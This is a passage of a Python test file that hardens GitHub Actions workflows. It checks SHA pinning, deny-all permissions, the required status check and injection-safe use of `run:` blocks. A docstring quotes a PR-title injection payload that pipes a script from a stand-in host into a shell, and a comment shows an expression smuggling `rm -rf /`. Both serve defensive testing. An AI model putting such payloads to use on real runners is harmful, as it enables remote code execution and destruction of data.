    """Collect the ``name:`` every job in one workflow displays.

    Args:
        data: A parsed workflow mapping.
        path: The workflow the mapping came from, used in failure messages.

    Returns:
        One ``(job id, declared name)`` pair per job, in declaration order.
    """
    return [
        (job_id, str(job.get(NAME_KEY, "")))
        for job_id, job in _workflow_jobs(data, path).items()
    ]


def _trigger_block(data: dict[object, object], event: str) -> object:
    """Return the value one named event's trigger maps to.

    Args:
        data: A parsed workflow mapping.
        event: The event name to look up.

    Returns:
        The trigger's value, or ``None`` when the event is not declared.
    """
    triggers = _trigger_value(data)
    if not isinstance(triggers, dict):
        return None
    return triggers.get(event)


def test_codeowners_gates_every_path_behind_one_owner(repo_root: Path) -> None:
    """Assert ``.github/CODEOWNERS`` claims the whole repository.

    Args:
        repo_root: The repository root, used to locate ``.github/CODEOWNERS``.
    """
    codeowners = repo_root / ".github" / "CODEOWNERS"
    assert codeowners.is_file(), f"required gating file is missing: {codeowners}"

    owner_lines = [
        stripped
        for line in codeowners.read_text(encoding="utf-8").splitlines()
        if (stripped := line.strip()) and not stripped.startswith("#")
    ]

    assert owner_lines, (
        f"{codeowners} declares no owner line, so nothing in the repository "
        "requires review; add a line reading "
        f"{CODEOWNERS_WILDCARD!r}"
    )
    assert owner_lines[0] == CODEOWNERS_WILDCARD, (
        f"the first owner line of {codeowners} is {owner_lines[0]!r}, expected "
        f"the whole-repo wildcard {CODEOWNERS_WILDCARD!r}; a narrower or "
        "differently-owned first line leaves paths ungated"
    )


def test_gitattributes_pins_every_text_file_to_lf(repo_root: Path) -> None:
    """Assert ``.gitattributes`` pins line endings to LF for all text files.

    Args:
        repo_root: The repository root, used to locate ``.gitattributes``.
    """
    gitattributes = repo_root / ".gitattributes"
    assert gitattributes.is_file(), f"required gating file is missing: {gitattributes}"

    rules = [
        line.strip() for line in gitattributes.read_text(encoding="utf-8").splitlines()
    ]
    assert GIT_ATTRIBUTES_RULE in rules, (
        f"{gitattributes} has no line exactly {GIT_ATTRIBUTES_RULE!r}; the "
        f"parsed rules were {rules!r}. A per-extension rule such as "
        "'*.py text=auto eol=lf' does not satisfy this, because the "
        "repository-wide rule is what makes normalisation total"
    )


def test_generated_council_artifact_is_never_committable(repo_root: Path) -> None:
    """Assert git itself reports the generated council file as ignored.

    This deliberately asks ``git`` instead of pattern-matching ``.gitignore``,
    so the assertion tracks the property that matters: the path cannot be
    staged. A weakened rule, or one whose glob no longer matches, fails here.

    Args:
        repo_root: The repository root, which is the working directory git is
            invoked in and the root its ignore rules are resolved against.
    """
    git = shutil.which("git")
    assert git is not None, "the git executable is not available on PATH"

    relative = COUNCIL_ARTIFACT.as_posix()
    completed = subprocess.run(  # ruff: ignore[subprocess-without-shell-equals-true]
        [git, "check-ignore", "--no-index", "-q", relative],
        cwd=repo_root,
        check=False,
        capture_output=True,
        text=True,
    )
    assert completed.returncode == 0, (
        f"git check-ignore --no-index exited {completed.returncode} for "
        f"{relative}, so that path is not ignored (0 means ignored, 1 means not "
        "ignored). The council extraction candidates file is regenerated on "
        "every council run and its SHA-256 dedup_key values trip gitleaks' "
        "generic-api-key rule, which scans full git history and would leave "
        f"the pre-push gate permanently red. {completed.stderr.strip()}"
    )


def test_project_description_is_not_the_scaffolding_placeholder(
    repo_root: Path,
) -> None:
    """Assert ``[project] description`` is real prose, not a ``hatchling`` stub.

    ``hatchling`` writes ``Add your description here`` into a freshly scaffolded
    manifest and no later build, lint or type check step objects to it, so the
    placeholder silently ships as the package's one-line summary. The comparison
    is case-insensitive because recasing the leading capital is the cheapest way
    to slip past a literal ``!=`` without actually writing a description.

    Args:
        repo_root: The repository root, used to locate ``pyproject.toml``.
    """
    manifest_path = repo_root / PYPROJECT_MANIFEST
    assert manifest_path.is_file(), f"required manifest is missing: {manifest_path}"

    project = tomllib.loads(manifest_path.read_text(encoding="utf-8"))["project"]
    description = project["description"]
    assert isinstance(description, str), (
        f"[project] description in {manifest_path} must be a string, got "
        f"{type(description).__name__} ({description!r})"
    )

    assert description.casefold() != SCAFFOLD_PLACEHOLDER_DESCRIPTION.casefold(), (
        f"[project] description in {manifest_path} is still the hatchling "
        f"scaffolding placeholder {description!r}; replace it with prose that "
        "describes what this package publishes"
    )

    stripped_description = description.strip()
    assert stripped_description, (
        f"[project] description in {manifest_path} is whitespace-only "
        f"({description!r}); it must carry actual text"
    )
    assert len(stripped_description) >= MIN_DESCRIPTION_LENGTH, (
        f"[project] description in {manifest_path} is "
        f"{len(stripped_description)} character(s) once stripped "
        f"({description!r}), which is below the {MIN_DESCRIPTION_LENGTH}-character "
        "floor, so it is a stub rather than a description"
    )


def test_requires_python_agrees_with_the_pinned_interpreter(repo_root: Path) -> None:
    """Assert the manifest's ``requires-python`` floor matches the pinned tools.

    ``.python-version`` is the local interpreter, ``[tool.ty.environment]
    python-version`` is what the type checker resolves against, ``[tool.ruff]
    target-version`` is what the linter assumes, and the CI matrix only runs
    3.14. This repository shipped exactly that drift: ``requires-python`` read
    ``>=3.13`` while ``.python-version``, ``[tool.ty.environment]
    python-version`` and ``[tool.ruff] target-version`` were all already
    ``3.14``/``py314``. The manifest therefore advertised 3.13 support that lint
    and type checking never verified, and no build, lint or type check step
    objected until the floor was reconciled against the pin.

    Args:
        repo_root: The repository root, used to locate ``pyproject.toml`` and
            ``.python-version``.
    """
    manifest_path = repo_root / PYPROJECT_MANIFEST
    version_path = repo_root / PYTHON_VERSION_PIN
    assert manifest_path.is_file(), f"required manifest is missing: {manifest_path}"
    assert version_path.is_file(), (
        f"required interpreter pin is missing: {version_path}"
    )

    project = tomllib.loads(manifest_path.read_text(encoding="utf-8"))["project"]
    requires_python = project["requires-python"]
    assert isinstance(requires_python, str), (
        f"[project] requires-python in {manifest_path} must be a string, got "
        f"{type(requires_python).__name__} ({requires_python!r})"
    )

    pinned_version = version_path.read_text(encoding="utf-8").strip()
    assert pinned_version, (
        f"{version_path} pins an empty interpreter version, so nothing "
        "reconciles the manifest floor against a real interpreter"
    )

    reconciled = f">={pinned_version}"
    assert requires_python == reconciled, (
        f"interpreter gates disagree: [project] requires-python in "
        f"{manifest_path} is {requires_python!r}, while {version_path} pins "
        f"{pinned_version!r}, which reconciles to {reconciled!r}. Exactly one of "
        f"those two files is wrong -- correct requires-python in "
        f"{manifest_path} or the pin in {version_path}, then re-check "
        "[tool.ruff] target-version and [tool.ty.environment] python-version"
    )

    assert requires_python == REQUIRED_REQUIRES_PYTHON, (
        f"[project] requires-python in {manifest_path} is {requires_python!r}, "
        f"expected {REQUIRED_REQUIRES_PYTHON!r}; the manifest floor must equal "
        "the interpreter that the linter, the type checker and CI actually use"
    )


def test_third_party_actions_are_sha_pinned_with_a_version_comment(
    repo_root: Path,
) -> None:
    """Assert every third-party ``uses:`` is an immutable SHA plus a version.

    A ``uses:`` value may name a mutable reference such as a tag (``@v4``) or a
    branch (``@main``). Whoever controls that tag controls the code this CI
    executes, and nothing in the workflow diff reveals the swap, because the tag
    is a perfectly legal reference that reads identically before and after. A
    40-character commit SHA is immutable, so the review that read the old line
    still describes the new one.

    The ``# vX.Y.Z`` comment is asserted against the raw line text rather than
    the parsed value, because parsing would discard the comment entirely and the
    requirement would silently become untestable. The comment is what makes the
    pin reviewable: Dependabot rewrites the SHA and relies on the comment to
    keep the jump legible, so dropping it destroys the audit trail even though
    it does not weaken the pin itself.

    Args:
        repo_root: The repository root, used to locate ``.github/workflows``.
    """
    inspected: list[str] = []
    offenders: list[str] = []
    for path in _workflow_paths(repo_root):
        for line_number, line in enumerate(
            path.read_text(encoding="utf-8").splitlines(), start=1
        ):
            match = USES_LINE_RE.match(line)
            if match is None:
                continue
            reference = match.group("reference")
            if not _is_third_party_action(reference):
                continue
            site = f"{path.relative_to(repo_root)}:{line_number}"
            inspected.append(f"{site} {reference}")
            problems = _pin_problems(reference, match.group("comment"))
            offenders.extend(f"{site} {reference}: {problem}" for problem in problems)

    assert inspected, (
        "no third-party `uses:` reference was found in any workflow under "
        f"{WORKFLOWS_DIR}, so SHA pinning is untested; at least one reference "
        "of the form `owner/repo@<40-hex-sha>` must exist for this to mean "
        "anything"
    )
    assert not offenders, (
        "third-party actions that are not SHA-pinned with a version comment:\n"
        + "\n".join(offenders)
        + "\nPin each to a 40-character lowercase-hex commit SHA and keep the "
        "`# vX.Y.Z` comment on the same line, so a mutable tag cannot change "
        "the code CI runs and Dependabot can still read the jump"
    )


def test_required_status_check_needs_every_other_job(repo_root: Path) -> None:
    """Assert the ``CI Status`` gate depends on every other job and always runs.

    The branch ruleset requires exactly one status check, ``CI Status``, which
    is implemented as a job that succeeds only when every applicable job
    succeeded. A job added to the workflow without also being added to
    ``needs`` therefore stops gating merges, and there is no symptom anywhere:
    not a red build, not a changed Actions UI, not a different ruleset. That is
    the exact silent-regression class these contract tests exist to catch, so
    the comparison is set equality in both directions rather than a subset
    check that would tolerate a stale id.

    ``if: always()`` belongs to the same contract. GitHub reports a *skipped*
    job as a successful required check, so without it a cancelled run reports
    the gate itself as skipped -- that is, passing -- and broken code merges.

    Args:
        repo_root: The repository root, used to locate ``.github/workflows``.
    """
    catalogue: dict[Path, dict[str, dict[object, object]]] = {}
    owners: list[tuple[Path, str]] = []
    for path in _workflow_paths(repo_root):
        jobs = _workflow_jobs(_load_workflow(path), path)
        catalogue[path] = jobs
        owners.extend(
            (path, job_id)
            for job_id, job in jobs.items()
            if job.get("name") == REQUIRED_STATUS_CHECK_NAME
        )

    assert owners, (
        f"no job named {REQUIRED_STATUS_CHECK_NAME!r} exists in any workflow "
        f"under {WORKFLOWS_DIR}. The branch ruleset gates merges on that exact "
        "name, so without it the repository has no enforced status check"
    )
    assert len(owners) == 1, (
        f"expected exactly one job named {REQUIRED_STATUS_CHECK_NAME!r}, found "
        f"{[f'{path.name}:{job_id}' for path, job_id in owners]}"
    )

    gate_path, gate_id = owners[0]
    gate_job = catalogue[gate_path][gate_id]
    expected = set(catalogue[gate_path]) - {gate_id}
    needed = _needed_job_ids(gate_job.get("needs"))

    missing = sorted(expected - needed)
    assert not missing, (
        f"job {gate_id!r} in {gate_path} does not depend on {missing}, so those "
        f"jobs no longer gate merges. {REQUIRED_STATUS_CHECK_NAME!r} is the only "
        "required check, and it succeeds whenever every job in its `needs` list "
        "succeeded, so a job absent from that list is invisible: it can fail, be "
        "cancelled, or be dropped, and the gate stays green. Add the ids to "
        f"{REQUIRED_STATUS_CHECK_NAME!r}.needs and forward their `result`"
    )

    extra = sorted(needed - expected)
    assert not extra, (
        f"job {gate_id!r} in {gate_path} depends on {extra}, which is not a job "
        f"declared in that file. The file declares "
        f"{sorted(catalogue[gate_path])}; `needs` must name existing jobs only"
    )

    condition = _normalise_expression(str(gate_job.get("if", "")))
    assert condition == ALWAYS_CONDITION, (
        f"job {gate_id!r} in {gate_path} declares if: {condition!r} rather than "
        f"{ALWAYS_CONDITION!r}. GitHub treats a skipped job as a *successful* "
        "required check, so a cancelled run would report the gate itself as "
        "skipped -- that is, passing -- and broken code would merge. Without "
        "this condition the gate silently stops gating exactly when a run is "
        "cancelled, which is when it matters most"
    )


def test_every_workflow_declares_on_permissions_and_concurrency(
    repo_root: Path,
) -> None:
    """Assert each workflow declares its trigger, permissions and concurrency.

    An absent ``permissions`` block means the workflow silently inherits
    whatever the repository-wide default happens to be. If that default is later
    loosened to ``write-all``, every job in every workflow gains write scope
    without a single line changing, and the workflow that least deserves it
    becomes the workflow that can push to the default branch. An absent
    ``concurrency`` block means superseded runs are not cancelled, so a rapid
    push sequence burns runner minutes re-testing commits that are already
    obsolete and the queue of stale runs reports stale results.

    Args:
        repo_root: The repository root, used to locate ``.github/workflows``.
    """
    for path in _workflow_paths(repo_root):
        relative = path.relative_to(repo_root)
        data = _load_workflow(path)

        assert _trigger_value(data), (
            f"{relative} declares no truthy `on:` key, so the workflow is "
            "unreachable and every job in it is dead configuration"
        )
        assert "permissions" in data, (
            f"{relative} declares no workflow-level `permissions:` block, so it "
            "silently inherits the repository default. If that default is ever "
            "loosened, this workflow's token scope changes without any line "
            "here changing; declare `contents: read` explicitly"
        )
        assert "concurrency" in data, (
            f"{relative} declares no `concurrency:` block, so superseded runs "
            "are not cancelled. Each new push leaves the previous run burning "
            "runner minutes to produce a verdict about a commit nobody will "
            "ship; add a `group` keyed on head_ref or run_id and set "
            "`cancel-in-progress: true`"
        )


def test_detect_changes_path_filters_cover_the_guarded_directories(
    repo_root: Path,
) -> None:
    """Assert the ``paths-filter`` config covers the paths it claims to guard.

    The ``CI Status`` gate is fail-closed, so an under-specified filter does
    not merely save time, it skips exactly the jobs that should have run. The
    sharpest instance is a dependency or tooling change that is not a ``.py``
    file: edit ``pyproject.toml`` or ``uv.lock`` without listing it under
    ``python``, and the Python jobs never start, the gate reads their absence
    as a legitimate skip, and a broken manifest merges behind green CI. The
    same argument applies to ``.github/workflows/*.yml`` under ``workflows``,
    where a typo'd extension would unguard every workflow edit.

    Args:
        repo_root: The repository root, used to locate ``.github/workflows``.
    """
    blocks = _paths_filter_blocks(repo_root)
    assert blocks, (
        f"no workflow under {WORKFLOWS_DIR} runs the {PATHS_FILTER_ACTION} step, "
        "so no path filter exists and every downstream job is gated on a "
        "convention nothing declares"
    )

    for site, parsed in blocks:
        assert isinstance(parsed, dict), (
            f"{site} has a `filters:` string that does not decode to a mapping "
            f"(got {type(parsed).__name__})"
        )
        names = {str(key) for key in parsed}
        assert names == EXPECTED_PATH_FILTERS, (
            f"{site} declares filters {sorted(names)}, expected exactly "
            f"{sorted(EXPECTED_PATH_FILTERS)}. Each named filter must match a "
            "job's `needs.detect-changes.outputs` reference, so a renamed or "
            "dropped filter leaves that job's condition permanently false and "
            "the job silently skipped"
        )

        python_paths = _filter_paths(parsed, "python")
        for required in REQUIRED_PYTHON_FILTER_PATHS:
            assert required in python_paths, (
                f"{site} does not list {required!r} under the `python` filter "
                f"(declared: {sorted(python_paths)}). A dependency or config "
                "change that is not a .py file would leave the Python jobs "
                "untriggered, and the fail-closed CI Status gate would read that "
                "skip as a pass"
            )

        workflows_paths = _filter_paths(parsed, "workflows")
        assert REQUIRED_WORKFLOWS_FILTER_PATH in workflows_paths, (
            f"{site} does not list {REQUIRED_WORKFLOWS_FILTER_PATH!r} under the "
            f"`workflows` filter (declared: {sorted(workflows_paths)}), so a "
            "workflow edit would not trigger the actionlint job that guards it"
        )


def _unsafe_run_expressions(
    sites: list[tuple[str, str, bool]],
) -> list[str]:
    """Find ``run:`` expressions that are not provably author-controlled.

    Split out of the test body because the classification is a real unit of
    logic with its own rules, and inlining it pushed the function past the
    ``C901`` complexity gate.

    Args:
        sites: ``(location, text, in_env)`` triples from
            :func:`_interpolation_sites`.

    Returns:
        One ``"location -> expression"`` string per expression in a ``run:``
        body whose context is neither in :data:`SAFE_EXPRESSION_RE`, nor
        :data:`UNTRUSTED_INPUT_RE` (reported separately), nor the single safe
        :data:`SAFE_EVENT_FIELD`.
    """
    unsafe: list[str] = []
    for site, text, _ in sites:
        if not site.endswith(RUN_SUFFIX):
            continue
        for match in WORKFLOW_EXPRESSION_RE.findall(text):
            if UNTRUSTED_INPUT_RE.fullmatch(match):
                continue
            # The WHOLE expression must match. A prefix test would wrongly
            # accept `${{ github.event.number && rm -rf / }}`.
            if SAFE_EXPRESSION_RE.fullmatch(match):
                continue
            if match.strip() == f"${{{{ {SAFE_EVENT_FIELD} }}}}":
                continue
            unsafe.append(f"{site} -> {match}")
    return unsafe


def test_no_untrusted_input_is_interpolated_into_run_blocks(repo_root: Path) -> None:
    """Assert no ``run:`` body interpolates ``${{ ... }}``.

    GitHub's own hardening guide requires untrusted input to reach a shell
    through ``env``, never through interpolation into the script text. A
    ``run:`` body is evaluated as a shell script, so writing
    ``${{ github.event.pull_request.title }}`` into one hands an
    attacker-controlled string to the shell verbatim, and a PR titled
    ``a"; curl evil.sh | sh; #`` executes on the runner. Passing the value
    through ``env`` and quoting it as ``"$PR_TITLE"`` makes the same string
    data instead of code.

    This is the highest-value attack surface in the repository, because the
    dependabot auto-merge workflow runs with write permissions: an injection
    there is not a red build but a push to the default branch.

    The assertion set is deliberately layered. The first check names the steps
    that carry both ``run:`` and ``env:``, because those are the ones where an
    expression was most likely to have been "helpfully" inlined and the failure
    needs a targeted message. The set-wide scan is what generalises: it also
    catches a ``run:`` with no ``env:`` block, and it catches untrusted input
    interpolated into a step ``name:``, an ``if:``, or a ``with:`` input, none
    of which is an ``env:`` mapping.

    Args:
        repo_root: The repository root, used to locate ``.github/workflows``.
    """
    sites: list[tuple[str, str, bool]] = []
    env_and_run: list[str] = []
    for path in _workflow_paths(repo_root):
        relative = path.relative_to(repo_root)
        data = _load_workflow(path)
        sites.extend(
            (f"{relative}::{loc}", text, in_env)
            for loc, text, in_env in _interpolation_sites(data, "", in_env=False)
        )
        for job_id, job in _workflow_jobs(data, path).items():
            for index, step in enumerate(_job_steps(job)):
                if RUN_KEY not in step or ENV_KEY not in step:
                    continue
                run_text = step[RUN_KEY]
                if isinstance(run_text, str) and WORKFLOW_EXPRESSION_RE.search(
                    run_text
                ):
                    env_and_run.append(f"{relative}::{job_id}::step[{index}]")

    assert sites, (
        f"no `${{{{ ... }}}}` expression was found in any workflow under "
        f"{WORKFLOWS_DIR}, so this scan is inspecting nothing. Every run that "
        "needs a matrix value or a step output interpolates one; if that is no "
        "longer true, this test should be deleted rather than left vacuous"
    )
    assert not env_and_run, (
        f"these steps carry both `run:` and `env:`, yet their `run:` body "
        f"interpolates an expression: {env_and_run}. A `run:` body is evaluated "
        "as a shell script, so a `${{ github.event.pull_request.* }}` inlined "
        "there turns an attacker-controlled branch name or PR title into command "
        "injection. Move the value into the step's `env:` block and quote the "
        'shell variable, e.g. `run: echo "$PR_TITLE"`'
    )

    run_sites: list[str] = []
    untrusted_outside_env: list[str] = []
    for site, text, in_env in sites:
        # Untrusted input is a failure wherever it appears outside an `env:`
        # mapping -- including a step `name:`, an `if:`, a `with:` input, or a
        # `run:` body. This check runs for every site, so it must be evaluated
        # for every site and must not be skipped by the `run:`-specific
        # handling that follows.
        if not in_env and UNTRUSTED_INPUT_RE.search(text):
            untrusted_outside_env.append(site)
        if site.endswith(RUN_SUFFIX):
            run_sites.append(site)

    unsafe_run_sites = _unsafe_run_expressions(sites)

    assert not unsafe_run_sites, (
        "these `run:` bodies interpolate an expression from an unrecognised "
        f"context: {sorted(set(unsafe_run_sites))}. A `run:` body is evaluated "
        "as a shell script, so only values that are repository-author literals "
        "or engine-supplied (`matrix.*`, `steps.*.outputs.*`, `needs.*.outputs"
        ".*`, `env.*`, `secrets.*`, or a structural `github.*` field) may be "
        "inlined. Anything an attacker can influence must go through the step's "
        "`env:` block instead. If a new context is genuinely safe, add it to "
        "SAFE_EXPRESSION_RE deliberately rather than inlining it here."
    )
    assert not untrusted_outside_env, (
        "untrusted input is interpolated outside an `env:` mapping at "
        f"{untrusted_outside_env}. `github.event.pull_request.*` and "
        "`github.event.issue.*` are fully attacker-controlled, so they must "
        "reach a shell only through an `env:` mapping, never inline in a "
        "script, a step name, a condition, or a `with:` input"
    )


def test_scheduled_security_workflows_get_their_own_concurrency_group(
    repo_root: Path,
) -> None:
    """Assert each scheduled security scan runs in a concurrency group of its own.

    ``cancel-in-progress`` is evaluated on the *arriving* run, not the one
    already queued. A scheduled CodeQL or Scorecard scan that shares a group
    with ordinary pushes is therefore killed by the next push that lands while
    it is still running -- and because the kill looks exactly like any other
    cancellation, nothing reports it. A security scan that silently never
    completes is worse than one that fails, because a failure at least appears
    in the Security tab. Both scans exist to surface findings from newly
    released rules against a codebase nobody is currently changing, which is
    precisely the situation where no push arrives to cancel them by accident and
    precisely the situation where a missed run goes unnoticed for a week.

    So the group must carry a distinct suffix for scheduled runs, and
    ``cancel-in-progress`` must be a *string expression* rather than the bare
    boolean ``true``: a bare ``true`` cancels the scheduled scan too, because it
    cancels whatever is in the group whenever anything new arrives.

    Args:
        repo_root: The repository root, used to locate ``.github/workflows``.
    """
    scheduled: dict[Path, dict[object, object]] = {}
    dropped: list[str] = []
    for path in _workflow_paths(repo_root):
        relative = path.relative_to(repo_root)
        data = _load_workflow(path)
        if SCHEDULE_LITERAL in _trigger_keys(data):
            scheduled[relative] = data
        elif relative.name in SCHEDULED_SECURITY_WORKFLOW_FILES:
            dropped.append(str(relative))

    assert scheduled, (
        f"no workflow under {WORKFLOWS_DIR} declares a `{SCHEDULE_LITERAL}:` "
        "trigger, so this scan is inspecting nothing. A scheduled run is the "
        "only way findings from newly released rules reach a codebase that is "
        "not currently being changed"
    )
    assert not dropped, (
        f"{dropped} no longer declares a `{SCHEDULE_LITERAL}:` trigger. Those are "
        "the weekly security scans, and the trigger is the only thing that runs "
        "them in a quiet week; without it their findings age out of the Security "
        "tab unnoticed"
    )

    shared_group: list[str] = []
    boolean_cancel: list[str] = []
    for relative, data in scheduled.items():
        concurrency = _as_mapping(
            data.get("concurrency"), f"`concurrency:` in {relative}"
        )
        group = str(concurrency.get("group", ""))
        if SCHEDULE_LITERAL not in group:
            shared_group.append(f"{relative}: group is {group!r}")
        cancel = concurrency.get("cancel-in-progress")
        if not isinstance(cancel, str) or EVENT_NAME_REFERENCE not in cancel:
            boolean_cancel.append(f"{relative}: cancel-in-progress is {cancel!r}")

    assert not shared_group, (
        "these scheduled workflows name no schedule-specific concurrency group:\n"
        + "\n".join(shared_group)
        + "\nAppend a conditional suffix keyed on "
        f"`github.event_name == '{SCHEDULE_LITERAL}'`, so a scheduled run lands "
        "in a group ordinary pushes never join"
    )
    assert not boolean_cancel, (
        "these scheduled workflows set a non-conditional `cancel-in-progress`:\n"
        + "\n".join(boolean_cancel)
        + "\n`cancel-in-progress` must be a string expression referencing "
        f"{EVENT_NAME_REFERENCE} so a scheduled run is never cancelled by a later "
        f"push, e.g. `${{{{ {EVENT_NAME_REFERENCE} != '{SCHEDULE_LITERAL}' }}}}`"
    )


def test_sarif_is_never_uploaded_from_a_pull_request_run(repo_root: Path) -> None:
    """Assert no SARIF upload can fire during a pull-request run.

    Scorecard's ``pull_request`` support is experimental and runs local-only, as
    ``supply-chain/local``. That result omits the ``branch-protection`` and
    ``online-scm`` categories that the default-branch run produces, so uploading
    it overwrites the default-branch baseline with a strictly weaker analysis and
    emits a "configurations not found" code-scanning warning on every pull
    request. A warning that appears on every PR trains reviewers to ignore
    code-scanning warnings -- which is the exact failure mode Scorecard exists to
    reduce.

    ``scorecard.yml`` carries no ``pull_request`` trigger at all today, so the
    per-step guard cannot fire yet. It is asserted anyway, together with the
    workflow-level rule, so that re-adding a PR trigger later cannot silently
    start overwriting the baseline: the trigger check fires immediately, and the
    step guard is already in place when it does.

    Args:
        repo_root: The repository root, used to locate ``.github/workflows``.
    """
    uploads: list[tuple[str, str]] = []
    for path in _workflow_paths(repo_root):
        for site, step in _step_sites(_load_workflow(path), path):
            if not _references_action(_step_uses(step), CODEQL_UPLOAD_SARIF_ACTION):
                continue
            condition = _normalise_expression(str(step.get("if", "")))
            uploads.append((site, condition))

    assert uploads, (
        f"no step uses {CODEQL_UPLOAD_SARIF_ACTION} in any workflow under "
        f"{WORKFLOWS_DIR}, so this scan is inspecting nothing. Uploading SARIF is "
        "how findings reach the Security tab; if that stopped happening the "
        "workflows are producing analysis nobody ever reads, and this test should "
        "be deleted rather than left vacuous"
    )

    unguarded = [
        f"{site} (if: {condition!r})"
        for site, condition in uploads
        if not _excludes_pull_request(condition)
    ]
    assert not unguarded, (
        "these SARIF upload steps are reachable from a pull-request run:\n"
        + "\n".join(unguarded)
        + "\nGive each an `if:` that names and negates the event, e.g. "
        f"`if: {EVENT_NAME_REFERENCE} != '{PULL_REQUEST_TRIGGER}'`. A "
        "`supply-chain/local` result from a pull request lacks the "
        "`branch-protection` and `online-scm` categories, so publishing it "
        "replaces the default-branch baseline with a weaker one and raises a "
        '"configurations not found" warning on every PR'
    )

    bare: list[str] = []
    both: list[str] = []
    for path in _workflow_paths(repo_root):
        data = _load_workflow(path)
        if not _has_bare_trigger(data, PULL_REQUEST_TRIGGER):
            continue
        relative = str(path.relative_to(repo_root))
        bare.append(relative)
        publishers = [
            site for site, step in _step_sites(data, path) if _publishes_sarif(step)
        ]
        if publishers:
            both.append(f"{relative}: {publishers}")

    assert bare, (
        f"no workflow under {WORKFLOWS_DIR} declares a bare `{PULL_REQUEST_TRIGGER}:` "
        "trigger, so the workflow-level check below cannot fire. A bare trigger is "
        "the risky shape -- it fires on pull requests from any branch, including "
        "forks -- and it is what makes an unguarded SARIF upload reachable"
    )
    assert not both, (
        "these workflows combine a bare pull-request trigger with a SARIF upload:\n"
        + "\n".join(both)
        + "\nQualify the trigger (for example with a `branches:` list) so fork "
        "pull requests cannot reach the code-scanning API, or drop the trigger. "
        "`github/codeql-action/analyze` counts as a SARIF upload because it "
        "publishes findings as its final act"
    )


def test_deny_all_permissions_convention_is_not_weakened(repo_root: Path) -> None:
    """Assert the deny-all default and its per-job replacement are both intact.

    ``zizmor.yml`` sets workflow-level ``permissions: {}``, which denies every
    scope and then re-grants only what each job declares. A workflow-level
    ``permissions: write-all`` hands every job in the file full write access to
    the repository -- including a job added six months from now that nobody
    reviewed in the context of a workflow-level grant, because the grant was
    already there. The blast radius of a compromise in that file would be the
    default branch rather than one analysis job.

    The per-job block is the other half. Deny-all plus no job-level permissions
    means the ``zizmor`` job cannot upload its findings at all: the run goes
    green, the Security tab goes stale, and nothing fails.

    The repo-wide sweep is checked for reachability rather than for a non-empty
    input, because a counter there would be dead code: the only way to empty it
    is to drop ``permissions:`` from every file, and
    ``test_every_workflow_declares_on_permissions_and_concurrency`` already
    asserts each file declares one, while this test's own deny-all assertion
    fires first for ``zizmor.yml``. Reachability is proved by setting
    ``write-all`` on a workflow other than ``zizmor.yml``.

    Args:
        repo_root: The repository root, used to locate ``.github/workflows``.
    """
    zizmor_path = repo_root / WORKFLOWS_DIR / ZIZMOR_WORKFLOW_FILE
    assert zizmor_path.is_file(), f"required gating file is missing: {zizmor_path}"

    top_level = _load_workflow(zizmor_path).get("permissions")
    assert isinstance(top_level, dict), (
        f"{ZIZMOR_WORKFLOW_FILE} declares workflow-level `permissions: "
        f"{top_level!r}` ({type(top_level).__name__}), which is not the deny-all "
        f"`{{}}`. The empty mapping is the whole point of the convention: it denies "
        "every scope so each job grants only what it needs, and it stops a job "
        "added later from inheriting write access to the repository"
    )
    assert not top_level, (
        f"{ZIZMOR_WORKFLOW_FILE} declares workflow-level `permissions: "
        f"{top_level!r}` rather than the deny-all `{{}}`. Any scope named there is "
        f"granted to every job in the file, and `{WRITE_ALL_PERMISSIONS}` in "
        "particular hands full write access to the repository to a job added later "
        "that nobody reviewed"
    )

    jobs = _workflow_jobs(_load_workflow(zizmor_path), zizmor_path)
    assert ZIZMOR_JOB_ID in jobs, (
        f"{ZIZMOR_WORKFLOW_FILE} declares no job named {ZIZMOR_JOB_ID!r} (it "
        f"declares {sorted(jobs)}), so the per-job permissions that replace the "
        "deny-all default cannot be checked"
    )
    granted = _as_mapping(
        jobs[ZIZMOR_JOB_ID].get("permissions"),
        f"`permissions:` of the {ZIZMOR_JOB_ID!r} job in {ZIZMOR_WORKFLOW_FILE}",
    )
    missing = {
        scope: value
        for scope, value in REQUIRED_ZIZMOR_JOB_PERMISSIONS.items()
        if granted.get(scope) != value
    }
    assert not missing, (
        f"the {ZIZMOR_JOB_ID!r} job in {ZIZMOR_WORKFLOW_FILE} does not declare "
        f"{missing} (it declares {dict(granted)!r}). With deny-all at the workflow "
        "level, the job-level block is the only thing granting these scopes, so "
        "without them the SARIF upload is rejected, the run still goes green, and "
        "the Security tab silently goes stale"
    )

    # This sweep is exhaustive over every workflow, so it cannot be vacuous:
    # `_workflow_paths` already asserts the directory is non-empty, and
    # `test_every_workflow_declares_on_permissions_and_concurrency` already
    # asserts that *every* one of those files declares a `permissions` key. An
    # anti-vacuity counter here would therefore be dead code -- the only way to
    # empty it is to drop the key from every file, which trips that sibling
    # test first.
    write_all: list[str] = []
    for path in _workflow_paths(repo_root):
        data = _load_workflow(path)
        if data.get("permissions") == WRITE_ALL_PERMISSIONS:
            write_all.append(str(path.relative_to(repo_root)))
    assert not write_all, (
        f"{write_all} declare a workflow-level `permissions: "
        f"{WRITE_ALL_PERMISSIONS}`. That grants every scope to every job in the "
        "file, so a job added later inherits full write access to the repository "
        "without anyone reviewing the grant. Use `permissions: {}` and declare "
        "only the scopes each job needs"
    )


def test_privileged_triggers_never_check_out_code(repo_root: Path) -> None:
    """Assert write-token triggers are paired with an explicit audit marker.

    ``pull_request_target`` and ``workflow_run`` both run with a write token
    against code an attacker can influence: the first against the contents of a
    pull request, the second against whatever the named upstream workflow
    produced. They are safe only while untrusted code is never executed, which
    means never checked out, never built, and never tested. A single checkout
    plus a build step in such a workflow is remote code execution with a push
    token, and it produces no visible symptom until the push lands.

    The `# zizmor: ignore[dangerous-triggers]` comment is the audit trail. It is
    asserted against the raw line because parsing discards it, and because the
    comment is what forces a reviewer to read this exact reasoning before adding
    a step -- the finding zizmor raises is the thing the comment has to answer
    for, so dropping the comment drops the record of having answered it.

    This is defence in depth for the dependabot auto-merge workflow being added
    next, which also contains no checkout.

    Args:
        repo_root: The repository root, used to locate ``.github/workflows``.
    """
    assignee = repo_root / WORKFLOWS_DIR / DEFAULT_ASSIGNEE_WORKFLOW_FILE
    assert assignee.is_file(), f"required gating file is missing: {assignee}"
    assert not _checkout_sites(_load_workflow(assignee), assignee), (
        f"{DEFAULT_ASSIGNEE_WORKFLOW_FILE} contains an `{CHECKOUT_ACTION}` step at "
        f"{_checkout_sites(_load_workflow(assignee), assignee)}. That file runs on "
        "`pull_request_target` and `workflow_run`, both of which carry a write "
        "token against attacker-influenceable code. Checking it out hands the "
        "contents of a pull request to a job that can push, and any build or test "
